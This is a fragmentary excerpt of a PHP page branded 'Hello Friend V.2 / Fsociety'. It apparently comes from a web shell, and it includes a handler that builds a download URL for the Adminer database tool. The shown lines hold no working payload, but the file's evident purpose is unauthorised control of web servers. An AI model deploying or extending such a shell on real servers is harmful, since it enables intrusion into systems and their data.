	...
	<div class="container">
		<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #27f6a4;">
			<div style="float:left;width:15%;text-align:center;border: 1px dashed #27f6a4;margin-bottom:5px;">
				<h1>
				<a href="?">Hello Friend V.2<br>
					<small>Fsociety</small>
				</a>
				</h1>
			</div>
...
if($_GET['ext'] == 'vdomain') {
	...
	echo '<center>';
	$version='4.8.1';
	$dwadminer = 'https://github.com/vrana/adminer/releases/download/v'.$version.'/adminer-'.$version.'.php';
...
echo '<div class="footer"> Hello Friend V2 &copy; 2018 - '.eof().' </div></div>';
?>